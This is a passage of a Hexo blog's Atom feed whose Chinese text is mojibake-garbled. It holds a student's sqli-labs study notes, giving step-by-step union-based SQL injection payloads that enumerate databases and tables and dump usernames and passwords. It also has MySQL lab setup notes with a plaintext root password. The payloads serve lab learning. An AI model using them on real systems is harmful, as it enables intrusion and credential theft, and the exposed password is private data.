    <updated>2021-01-30T14:48:16.341Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ä¸€-æ‰¾æ³¨å…¥ç‚¹"><a href="#ä¸€-æ‰¾æ³¨å…¥ç‚¹" class="headerlink" title="ä¸€.æ‰¾æ³¨å…¥ç‚¹"></a>ä¸€.æ‰¾æ³¨å…¥ç‚¹</h4><p>ç”±é¢˜ç›®æç¤ºï¼šæ³¨å…¥ç‚¹ä¸ºæ•´æ•°ã€‚</p><p>è¯•æ¢ï¼šè¾“å…¥?id=1è¿”å›æ­£å¸¸ï¼›è¾“å…¥?id=0è¿”å›å¼‚å¸¸ï¼›ä¸”è¾“å…¥?id=0 or 1=1â€“+å¾—åˆ°çš„è¿”å›å€¼æ­£ç¡®ã€‚æ•…è¯¥å¤„å­˜åœ¨sqlæ³¨å…¥ç‚¹ã€‚</p><p>äºŒ.åˆ¤æ–­å­—æ®µæ•°</p><p>è¾“å…¥?id=1 order by nâ€“+ç›´åˆ°è¾“å…¥n=4æ—¶è¿”å›é”™è¯¯ã€‚æ•…æ•°æ®åº“ä¸­å­˜åœ¨3ä¸ªå­—æ®µã€‚</p><p>ä¸‰.çˆ†å¼€æ•°æ®åº“ï¼šå¾—åˆ°æ•°æ®åº“å</p><p>è¾“å…¥?id=0 uion select 1,2,database()â€“+è¯­å¥</p><p>å››.çˆ†å¼€æ•°æ®è¡¨ï¼šå¾—åˆ°æ•°æ®è¡¨å</p><p>è¾“å…¥?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() â€“+è¯­å¥ã€‚</p><p>æ³¨ï¼štable_schema=database()èµ‹å€¼è¯­å¥ï¼Œå³åˆ—å‡ºæ•°æ®åº“ä¸­çš„è¡¨å</p><p>äº”.çˆ†å¼€æ•°æ®åˆ—ï¼šå¾—åˆ°æ•°æ®åˆ—å</p><p>è¾“å…¥?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=â€™usersâ€™ â€“+è¯­å¥</p><p>å…­.çˆ†å¼€æ•°æ®å€¼</p><p>è¾“å…¥?id=0 union select 1,group_concat(username,0x3a,password),3 from usersâ€“+è¯­å¥ã€‚</p><p>ä¸ƒ.æ€»ç»“ï¼šlesson1â€”4çš„çˆ†åº“æ–¹æ³•åŸºæœ¬ä¸€è‡´ï¼Œåªæœ‰åœ¨æ³¨å…¥ç‚¹ä¸Šç•¥æœ‰ä¸åŒã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;ä¸€-æ‰¾æ³¨å…¥ç‚¹&quot;&gt;&lt;a href=&quot;#ä¸€-æ‰¾æ³¨å…¥ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;ä¸€.æ‰¾æ³¨å…¥ç‚¹&quot;&gt;&lt;/a&gt;ä¸€.æ‰¾æ³¨å…¥ç‚¹&lt;/h4&gt;&lt;p&gt;ç”±é¢˜ç›®æç¤ºï¼šæ³¨å…¥ç‚¹ä¸ºæ•´æ•°ã€‚&lt;/p&gt;
&lt;p&gt;è¯•æ¢ï¼šè¾“å…¥?id=1è¿”å›æ­£å¸¸ï¼›è¾“å…¥?id=0è¿”å›å¼‚å¸¸ï¼›ä¸”è¾“å…¥?id</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>lesson1</title>
    <link href="http://example.com/2020/11/14/blog%20c/"/>
    <id>http://example.com/2020/11/14/blog%20c/</id>
    <published>2020-11-14T13:07:05.000Z</published>
    <updated>2021-04-01T10:36:28.342Z</updated>
    
    <content type="html"><![CDATA[<p>å‰è¨€ï¼šè¿™æ˜¯ç¬¬äºŒæ¬¡å†™lesson1çš„blogï¼Œä¸‡äº‹å¼€å¤´éš¾ã€‚</p><p>ä¸€.å¯»æ‰¾sqlæ³¨å…¥ç‚¹</p><p>æ ¹æ®æ ‡é¢˜æç¤ºè¯¥sqlæ³¨å…¥ç‚¹ä¸ºå•å¼•å·ã€‚è¾“å…¥?id=1â€™è¿”å›å€¼é”™è¯¯ï¼›è¾“å…¥?id=1è¿”å›å€¼æ­£å¸¸ã€‚æ•…å­˜åœ¨æ³¨å…¥ç‚¹ã€‚</p><p>æ³¨ï¼š1.ï¼ˆè‡ªå·±çš„æ‘¸ç´¢ï¼‰ï¼šå‘ç°è¾“å…¥id=éæ­£æ•´æ•°å¦‚ï¼ˆ?id=-1ï¼‰æ—¶ï¼Œé¡µé¢è¿”å›ä¸ºç©ºã€‚è¿™æ˜¯å› ä¸ºè¿™äº›æ•°å€¼ä¸åœ¨æ•°æ®åº“èŒƒå›´ä¹‹å†…ï¼Œæ•…è¿”å›ä¸ºç©ºã€‚</p><p>2.ä¸æ˜¯æ‰€æœ‰å¼•èµ·æŠ¥é”™çš„ç‚¹éƒ½æ˜¯æ³¨å…¥ç‚¹ï¼Œä¹Ÿå¯èƒ½æ˜¯ç”±äºå•çº¯çš„è¯­æ³•é”™è¯¯å¯¼è‡´äº†é¡µé¢æŠ¥é”™ã€‚è€Œå½“å­˜åœ¨ä¸€ä¸ªçœŸæ­£çš„æ³¨å…¥ç‚¹æ—¶ï¼Œè¾“å…¥?id=0+æ³¨å…¥ç‚¹+or 1=1â€“+è¯­å¥è¿”å›å€¼æ­£å¸¸ï¼Œåä¹‹æŠ¥é”™ã€‚</p><p>äºŒ.æŸ¥è¯¢å­—æ®µæ•°</p><p>åˆ©ç”¨order byè¯­å¥ã€‚?id=1%27%20order%20by%20<em>n</em>â€“+ï¼ˆnä¸ºæ­£æ•´æ•°ï¼Œä¸æ–­æ”¹å˜nçš„å€¼é€šè¿‡è§‚å¯Ÿè¿”å›çŠ¶æ€ç¡®å®šå­—æ®µæ•°ï¼‰å¦‚ï¼š</p><p>è¾“å…¥?id=1%27%20order%20by%201â€“+ï¼Œè¿”å›æ­£å¸¸ã€‚</p><p>è¾“å…¥?id=1%27%20order%20by%204â€“+ï¼Œè¿”å›å¼‚å¸¸ã€‚</p><p>å½“è¾“å…¥åˆ°ç¬¬n-1ä¸ªæ­£å¸¸ï¼Œç¬¬nä¸ªä¸æ­£å¸¸æ—¶ï¼Œè¯´æ˜æ‹¥æœ‰n-1ä¸ªå­—æ®µæ•°ã€‚</p><p>æ³¨ï¼šå­—æ®µæ•°å°±æ˜¯sqlæ•°æ®åº“ä¸­å­˜åœ¨å˜é‡æ•°çš„ä¸ªæ•°ã€‚</p><p>ä¸‰.union selectçœ‹è¿”å›å€¼</p><p>1.åˆ©ç”¨union selectè¯­å¥æŸ¥çœ‹å­—æ®µæ•°è¿”å›å€¼ã€‚?id=-1%27union%20select%201,2,3â€“+ã€‚</p><p>åªæœ‰2,3ä»£è¡¨çš„å›æ˜¾ä½èƒ½è¢«è§‚å¯Ÿåˆ°ï¼Œå³ç”¨æˆ·ä»æµè§ˆå™¨ä¸Šåé¦ˆçœ‹è§çš„åªæœ‰2,3å›æ˜¾ä½ã€‚</p><p>2.åˆ©ç”¨union selectè¯­å¥æŸ¥çœ‹æ•°æ®åº“è¿”å›å€¼ã€‚</p><p>è¾“å…¥?id=-1%27union%20select%201,database(),2â€“+.</p><p>ç”±æ­¤å¯çŸ¥ï¼šdatabaseçš„åç§°ä¸ºsecurityã€‚</p><p>æ³¨æ„ä½¿ç”¨union select</p><p>å››.æŸ¥è¡¨</p><p>1.è¾“å…¥?id=-1â€™ union select 1 ,2,group_concat(table_name) from information_schema.tables where table_schema=â€˜sercurityâ€™â€“+å³å¯æŸ¥è·åœ¨sercurityæ•°æ®åº“ä¸­çš„è¡¨å•åã€‚</p><p>æ³¨ï¼šå¯¹äºç†è§£è¯¥ä»£ç ï¼šgroup_concat(table_name) ï¼šgroup_concatå‡½æ•°æ˜¯å…¸å‹çš„å­—ç¬¦ä¸²è¿æ¥å‡½æ•°ï¼›from information_schema.tablesï¼šæ¥è‡ªä¿¡æ¯å›¾è¡¨æ•°æ®åº“ä¸­çš„è¡¨å•ã€‚where table_schema=â€˜sercurityâ€™å…¶ä¸­whereä¸ºé™åˆ¶è¯ï¼Œwhere table_schema=â€˜sercurityâ€™:å¯»æ‰¾èŒƒå›´åœ¨æ•°æ®åº“åä¸ºsercurityä¸­ã€‚</p><p>ps:ä¸ºäº†æ–¹ä¾¿åœ¨é¡µé¢ä¸Šçœ‹åˆ°è‡ªå·±åœ¨urlé‡Œè¾“å…¥çš„å†…å®¹å¯ä»¥åœ¨indexæ–‡ä»¶é‡ŒåŠ ä¸€å¥<code>echo &quot; $sql&lt; br &gt;&quot;</code>;</p><p>äº”.æŸ¥å­—æ®µåä»¥åŠå­—æ®µæ•°å€¼</p><p>1.è¾“å…¥?id=-1â€™ union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database()â€“+å¯æŸ¥å¾—å­—æ®µåã€‚</p><p>2.è¾“å…¥?id=-1â€™union select 1,2,group_concat(username,0x3a,password) from usersâ€“+å¯æŸ¥å¾—æ¯ä¸ªç”¨æˆ·å¯¹åº”çš„å¯†ç ï¼ˆ0x3aæ˜¯å­—ç¬¦å†’å·ï¼Œï¼šâ€™å¯¹åº”16è¿›åˆ¶çš„ASCLLç ï¼‰</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‰è¨€ï¼šè¿™æ˜¯ç¬¬äºŒæ¬¡å†™lesson1çš„blogï¼Œä¸‡äº‹å¼€å¤´éš¾ã€‚&lt;/p&gt;
&lt;p&gt;ä¸€.å¯»æ‰¾sqlæ³¨å…¥ç‚¹&lt;/p&gt;
&lt;p&gt;æ ¹æ®æ ‡é¢˜æç¤ºè¯¥sqlæ³¨å…¥ç‚¹ä¸ºå•å¼•å·ã€‚è¾“å…¥?id=1â€™è¿”å›å€¼é”™è¯¯ï¼›è¾“å…¥?id=1è¿”å›å€¼æ­£å¸¸ã€‚æ•…å­˜åœ¨æ³¨å…¥ç‚¹ã€‚&lt;/p&gt;
&lt;p&gt;æ³¨ï¼š1.ï¼ˆè‡ªå·±çš„æ‘¸ç´¢ï¼‰ï¼šå‘ç°è¾“å…¥id=éæ­£æ•´æ•°</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥åŸºæœ¬çŸ¥è¯†lesson1</title>
    <link href="http://example.com/2020/11/10/blog%20b/"/>
    <id>http://example.com/2020/11/10/blog%20b/</id>
    <published>2020-11-10T13:00:12.000Z</published>
    <updated>2021-01-31T04:39:16.108Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ä¸€-åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•"><a href="#ä¸€-åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•" class="headerlink" title="ä¸€.åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•"></a>ä¸€.åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•</h3><h4 id="1-åŸºç¡€ä¸­çš„åŸºç¡€ï¼šgetå•å¼•å·åˆ¤æ–­"><a href="#1-åŸºç¡€ä¸­çš„åŸºç¡€ï¼šgetå•å¼•å·åˆ¤æ–­" class="headerlink" title="1.åŸºç¡€ä¸­çš„åŸºç¡€ï¼šgetå•å¼•å·åˆ¤æ–­"></a>1.åŸºç¡€ä¸­çš„åŸºç¡€ï¼šgetå•å¼•å·åˆ¤æ–­</h4><p>åœ¨åœ°å€æ ç½‘å€ååŠ **?id=1<strong>ï¼Œæ˜¾ç¤ºæ­£å¸¸ï¼›åŠ </strong>?id=1â€™<strong>ï¼Œæ˜¾ç¤ºé”™è¯¯ã€‚åˆ™è¯´æ˜å­˜åœ¨sqlæ³¨å…¥ç‚¹ã€‚ä¸”</strong>â€˜**çš„urlç¼–ç æ˜¯%27.</p><h4 id="2-get-andåˆ¤æ–­"><a href="#2-get-andåˆ¤æ–­" class="headerlink" title="2.get andåˆ¤æ–­"></a>2.get andåˆ¤æ–­</h4><p>è¾“å…¥<code>?id=-1 and 1=1</code>    æ­£å¸¸ï¼›</p><p>è¾“å…¥<code>?id=-1&#39;and 1=2</code>    æŠ¥é”™ï¼›å­˜åœ¨sqlã€‚</p><p>æ€»ç»“ï¼šåœ¨è¯·æ±‚å­—ç¬¦ä¸²æˆ–idå‚æ•°ååŠ <strong>â€™</strong>ï¼Œæ˜¯ä¸€ç§åŸºæœ¬æ£€æµ‹æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•ã€‚</p><h4 id="3-Orã€xoråˆ¤æ–­"><a href="#3-Orã€xoråˆ¤æ–­" class="headerlink" title="3.Orã€xoråˆ¤æ–­"></a>3.Orã€xoråˆ¤æ–­</h4><p>åŒget andåˆ¤æ–­</p><h4 id="4-sqlè¿ç®—ç¬¦åˆ¤æ–­"><a href="#4-sqlè¿ç®—ç¬¦åˆ¤æ–­" class="headerlink" title="4.sqlè¿ç®—ç¬¦åˆ¤æ–­"></a>4.sqlè¿ç®—ç¬¦åˆ¤æ–­</h4><h4 id="5-é€šè¿‡sleepå‡½æ•°æ¼”ç¤ºæ˜¾ç¤ºçš„å½¢å¼è¿›è¡Œåˆ¤æ–­"><a href="#5-é€šè¿‡sleepå‡½æ•°æ¼”ç¤ºæ˜¾ç¤ºçš„å½¢å¼è¿›è¡Œåˆ¤æ–­" class="headerlink" title="5.é€šè¿‡sleepå‡½æ•°æ¼”ç¤ºæ˜¾ç¤ºçš„å½¢å¼è¿›è¡Œåˆ¤æ–­"></a>5.é€šè¿‡sleepå‡½æ•°æ¼”ç¤ºæ˜¾ç¤ºçš„å½¢å¼è¿›è¡Œåˆ¤æ–­</h4><h4 id="6-æœåŠ¡ç«¯è¿”å›é”™è¯¯å½¢å¼"><a href="#6-æœåŠ¡ç«¯è¿”å›é”™è¯¯å½¢å¼" class="headerlink" title="6.æœåŠ¡ç«¯è¿”å›é”™è¯¯å½¢å¼"></a>6.æœåŠ¡ç«¯è¿”å›é”™è¯¯å½¢å¼</h4><h4 id="7-äº†è§£postã€getã€ç¼–ç "><a href="#7-äº†è§£postã€getã€ç¼–ç " class="headerlink" title="7.äº†è§£postã€getã€ç¼–ç "></a>7.äº†è§£postã€getã€ç¼–ç </h4><p><code>#</code> æ˜¯sqlè¯­å¥ä¸­çš„æ³¨é‡Šç¬¦ï¼›</p><p><code>+</code> åœ¨httpè¯·æ±‚ä¸­è¡¨ç¤ºç©ºæ ¼ï¼›</p><p><code>--</code> åé¢çš„è¯­å¥ç›¸å½“äºè¢«æ³¨é‡Šæ‰,ä¸æ‰§è¡Œåé¢çš„sqlè¯­å¥ï¼›</p><p><code>--+</code>ä»£è¡¨é—­åˆsqlæŸ¥è¯¢è¯­å¥ï¼Œå¦‚æœæ²¡åŠ ï¼Œæ— æ³•å½¢æˆæœ‰æ•ˆçš„mysqlè¯­å¥ã€‚</p><p>åœ¨postå‚æ•°ä¸­ï¼Œè¦åŠ ç©ºæ ¼ç¬¦æ—¶ï¼Œç›´æ¥è¾“å…¥ç©ºæ ¼ç¬¦å³å¯ï¼›ç”¨+ä¼šè¢«httpè¯·æ±‚è½¬ä¹‰ä¸º%23ç¼–ç ï¼›</p><p>åœ¨getè¯·æ±‚ä¸­ï¼Œå¦‚æœæƒ³ä½¿ç”¨ç©ºæ ¼ï¼Œéœ€è¦ç”¨ç©ºæ ¼ç¬¦ç¼–ç <code>%20</code>æ¥æ›¿ä»£ï¼Œä¸ç„¶ä¼šè¯·æ±‚æŠ¥é”™ï¼›å¦‚æœä½¿ç”¨#ï¼Œåˆ™#åé¢çš„å‚æ•°ä¸ä¼šæäº¤åˆ°æœåŠ¡å™¨ï¼Œä½†å¦‚æœä½¿ç”¨ç¼–ç %23å³å¯æäº¤åˆ°æœåŠ¡å™¨ã€‚</p><h5 id="å¸¸è§çš„urlç¼–ç ï¼š"><a href="#å¸¸è§çš„urlç¼–ç ï¼š" class="headerlink" title="å¸¸è§çš„urlç¼–ç ï¼š"></a>å¸¸è§çš„urlç¼–ç ï¼š</h5><p>ç©ºæ ¼ ï¼š<code>%20</code> ï¼›           + ï¼š%2Bï¼›          &lt; ï¼š%3Cï¼›            &gt; ï¼š%3E         â€˜ :   %27         #ï¼š %23</p><h4 id="8-sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"><a href="#8-sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°" class="headerlink" title="8.sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"></a>8.sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°</h4><p>1.order byï¼šè¯¥å‡½æ•°å¯¹ç»“æœé›†è¿›è¡Œæ’åºï¼Œç”¨äºçŒœæµ‹å­—æ®µæ•°ã€‚ä¾‹å¦‚è¾“å…¥?id=1â€™ order by 3 â€“+æ˜¾ç¤ºæ­£å¸¸ï¼›è¾“å…¥?id=1â€™ order by 4 â€“+æ˜¾ç¤ºé”™è¯¯ã€‚æ•…å¾—å‡ºåœ¨?id=1æŸ¥çœ‹çš„è¡¨æœ‰3ä¸ªå­—æ®µ</p><h4 id="äºŒ-ç¡®è®¤å­—æ®µæ•°"><a href="#äºŒ-ç¡®è®¤å­—æ®µæ•°" class="headerlink" title="äºŒ.ç¡®è®¤å­—æ®µæ•°"></a>äºŒ.ç¡®è®¤å­—æ®µæ•°</h4><p>ç¡®è®¤å­—æ®µæ•°å¯ä»¥ä½¿ç”¨order byè¯­å¥ï¼Œä¾‹å¦‚ï¼š?id=1â€™ order by 4 %23 æ—¶æŠ¥é”™!</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;ä¸€-åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•&quot;&gt;&lt;a href=&quot;#ä¸€-åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•&quot; class=&quot;headerlink&quot; title=&quot;ä¸€.åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•&quot;&gt;&lt;/a&gt;ä¸€.åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥çš„æ–¹æ³•&lt;/h3&gt;&lt;h4 id=&quot;1-åŸºç¡€ä¸­çš„åŸºç¡€ï¼š</summary>
      
    
    
    
    
    <category term="sqlilabs" scheme="http://example.com/tags/sqlilabs/"/>
    
  </entry>
  
  <entry>
    <title>MYSQL</title>
    <link href="http://example.com/2020/11/09/MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>http://example.com/2020/11/09/MYSQL%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2020-11-09T13:29:45.000Z</published>
    <updated>2021-01-31T12:05:38.730Z</updated>
    
    <content type="html"><![CDATA[<p>1.MYSQLæ³¨å…¥åœ¨çº¿é¶åœº<a href="https://www.anquanlong.com/lab_detail?lab_id=3&amp;lib=1">https://www.anquanlong.com/lab_detail?lab_id=3&amp;lib=1</a></p><p>   ä¸ªäººç”¨phpstudyæ­å»ºæœ¬åœ°é¶åœºã€‚</p><p>2.æ›´æ”¹rootå¯†ç æ—¶åº”è¯¥åŒæ—¶ä¿®æ”¹ç½‘å€çš„æ ¹ç›®å½•ä¸‹å¯¹åº”æ–‡ä»¶ä¸­çš„å¯†ç ã€‚å¦‚sql-connectionsæ–‡ä»¶ä¸­ã€‚</p><h4 id="MYSQLæ•°æ®åº“çš„ä½¿ç”¨"><a href="#MYSQLæ•°æ®åº“çš„ä½¿ç”¨" class="headerlink" title="MYSQLæ•°æ®åº“çš„ä½¿ç”¨"></a>MYSQLæ•°æ®åº“çš„ä½¿ç”¨</h4><p>1.åœ¨D:\phpstudy_pro\Extensions\MySQL5.7.26\binç›®å½•ä¸‹æ‰“å¼€ï¼Œè¾“å…¥è¯­å¥./mysql.exe -uroot -pï¼›</p><p>2.è·³å‡ºè¯­å¥è®©ä½ è¾“å…¥å¯†ç ï¼ˆlcj20020425ï¼‰ï¼›</p><p>3.è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼Œè¯­å¥ä»¥ï¼›ç»“å°¾ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;1.MYSQLæ³¨å…¥åœ¨çº¿é¶åœº&lt;a href=&quot;https://www.anquanlong.com/lab_detail?lab_id=3&amp;amp;lib=1&quot;&gt;https://www.anquanlong.com/lab_detail?lab_id=3&amp;amp;lib=1&lt;</summary>
      
    
    
    
    
    <category term="MySQLæ•°æ®åº“çš„æ­å»ºä¸å¯åŠ¨" scheme="http://example.com/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2020/10/01/blog1/"/>
    <id>http://example.com/2020/10/01/blog1/</id>
    <published>2020-10-01T13:32:41.724Z</published>
    <updated>2020-11-11T11:09:36.789Z</updated>
    
    <content type="html"><![CDATA[<hr><p>title: â€œæ­å»ºçš„åšå®¢â€<br>date: 2020-10-01 21:32:41<br>tags:<br>description:<br>1.ç”¨git bashè¿›è¡Œhexo initæŒ‡ä»¤æ—¶ä¸€å®šè¦è®¤æ¸…æ¥šæ–‡ä»¶å¤¹ï¼Œæ˜¯å¯¹hexoæ–‡ä»¶å¤¹è¿›è¡Œæ ¼å¼åŒ–ï¼Œæˆ‘åˆšåˆšå¼€å§‹åšçš„æ—¶å€™å¯¹blogæ–‡ä»¶å¤¹ä¸€ç›´åšæ ¼å¼åŒ–å¯¼è‡´è€—è´¹äº†å¾ˆä¹…æ—¶é—´<br>2.åœ¨å¤åˆ¶ä¸ªäººgithubåœ°å€åç²˜è´´åœ¨congigæ—¶å¯èƒ½ä¼šæ··æ‚è®¸å¤šç©ºæ ¼ï¼Œè¿™äº›ç©ºæ ¼ä¼šå½±å“ä½ æ‰§è¡Œhexo dæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•å°†æœ¬åœ°æ–‡ä»¶éƒ¨ç½²åˆ°ä¸ªäººç½‘é¡µä¸Š</p><p>3.ç”Ÿäº§æ–°åšå®¢ï¼šhexo new blogx</p><p>4.å†™blogçš„æ—¶å€™è¦ä½¿ç”¨ç¼–ç UTF-8,å¦åˆ™ä¼ è¾“åˆ°hexoç½‘é¡µä¸Šä¼šæ˜¾ç¤ºä¹±ç </p><p>5.ç”¨hexo gï¼›hexo dæŒ‡ä»¤ä¸Šä¼ åšå®¢æ—¶è¦åœ¨**<u>hexoæ–‡ä»¶</u>**ä¸‹å»ºç«‹çš„hexo bashä¸­è¾“å…¥ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;hr&gt;
&lt;p&gt;title: â€œæ­å»ºçš„åšå®¢â€&lt;br&gt;date: 2020-10-01 21:32:41&lt;br&gt;tags:&lt;br&gt;description:&lt;br&gt;1.ç”¨git bashè¿›è¡Œhexo initæŒ‡ä»¤æ—¶ä¸€å®šè¦è®¤æ¸…æ¥šæ–‡ä»¶å¤¹ï¼Œæ˜¯å¯¹hexoæ–‡ä»¶å¤¹è¿›è¡Œæ ¼å¼åŒ–ï¼Œæˆ‘åˆšåˆšå¼€å§‹åšçš„æ—¶å€™å¯¹</summary>
      
    
    
    
    
  </entry>
  
</feed>
